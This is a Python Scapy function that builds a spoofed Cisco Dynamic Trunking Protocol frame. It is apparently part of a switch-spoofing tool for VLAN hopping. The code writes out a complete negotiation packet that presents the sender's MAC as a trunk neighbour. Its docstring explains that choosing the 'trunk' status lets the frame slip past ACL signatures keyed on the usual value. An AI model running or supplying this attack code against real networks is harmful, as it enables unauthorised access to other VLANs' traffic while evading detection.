def dtp_frame(m, mode=0x03):
    """DTP frame. TLV layout per Wireshark packet-dtp.c (validated against
    US patent 6,445,715) and dtp-spoof:
      version(1B)=0x01, TLVs = type(2)+len(2, incl hdr)+value:
      0x0001 Domain | 0x0002 Trunk Status | 0x0003 Trunk Type | 0x0004 Neigh
    Status byte: 0x81 trunk-on, 0x03 desirable, 0x04 auto, 0x02 access;
    Type byte 0xA5 = negotiated/802.1Q. mode='trunk' (0x81) pretends our
    port already IS a trunk - slips past ACL signatures keying on 0x03."""
    def tlv(t, v):
        return struct.pack("!HH", t, 4 + len(v)) + v
    neigh = bytes(int(x, 16) for x in m.split(":"))
    body = (b"\x01" +                    # protocol version
            tlv(0x0001, b"\x00") +       # null domain
            tlv(0x0002, bytes([mode])) +  # trunk status
            tlv(0x0003, b"\xa5") +       # negotiated 802.1Q
            tlv(0x0004, neigh))          # our MAC as neighbor
    return (Ether(dst="01:00:0c:cc:cc:cc", src=m) /
            LLC(dsap=0xAA, ssap=0xAA, ctrl=3) /
            SNAP(OUI=0x00000C, code=0x2004) / body)


